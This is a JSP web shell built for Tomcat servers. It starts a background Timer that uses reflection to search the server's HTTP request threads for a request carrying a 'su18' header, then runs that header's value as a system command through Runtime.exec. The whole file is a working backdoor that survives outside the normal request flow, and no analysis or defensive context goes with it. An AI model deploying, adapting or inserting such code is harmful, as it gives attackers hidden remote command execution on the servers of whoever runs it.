<%@ page import="java.util.List" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.ArrayList" %>
<%@ page import="java.util.HashSet" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    public static List<Object> getRequest() {
        try {
            Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads"));

            for (Thread thread : threads) {
                if (thread != null) {
                    String threadName = thread.getName();
                    if (!threadName.contains("exec") && threadName.contains("http")) {
                        Object target = getField(thread, "target");
                        if (target instanceof Runnable) {
                            try {
                                target = getField(getField(getField(target, "this$0"), "handler"), "global");
                            } catch (Exception var11) {
                                continue;
                            }

                            List processors = (List) getField(target, "processors");

                            for (Object processor : processors) {
                                target = getField(processor, "req");

                                threadName = (String) target.getClass().getMethod("getHeader", String.class).invoke(target, new String("su18"));
                                if (threadName != null && !threadName.isEmpty()) {

                                    Object       note = target.getClass().getDeclaredMethod("getNote", int.class).invoke(target, 1);
                                    Object       req  = note.getClass().getDeclaredMethod("getRequest").invoke(note);
                                    List<Object> list = new ArrayList<Object>();
                                    list.add(req);
                                    list.add(threadName);
                                    return list;
                                }
                            }
                        }
                    }
                }
            }
        } catch (Exception ignored) {
        }

        return new ArrayList<Object>();
    }

    private static Object getField(Object object, String fieldName) throws Exception {
        Field field = null;
        Class clazz = object.getClass();

        while (clazz != Object.class) {
            try {
                field = clazz.getDeclaredField(fieldName);
                break;
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }

        if (field == null) {
            throw new NoSuchFieldException(fieldName);
        } else {
            field.setAccessible(true);
            return field.get(object);
        }
    }
%>
<%
    final HashSet<Object> set = new HashSet<Object>();
    java.util.Timer executeSchedule = new java.util.Timer();
    executeSchedule.schedule(new java.util.TimerTask() {
        public void run() {
            List<Object> list = getRequest();
            if (list.size() == 2) {
                if (!set.contains(list.get(0))) {
                    set.add(list.get(0));
                    try {
                        Runtime.getRuntime().exec(list.get(1).toString());
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        }
    }, 0, 100);
%>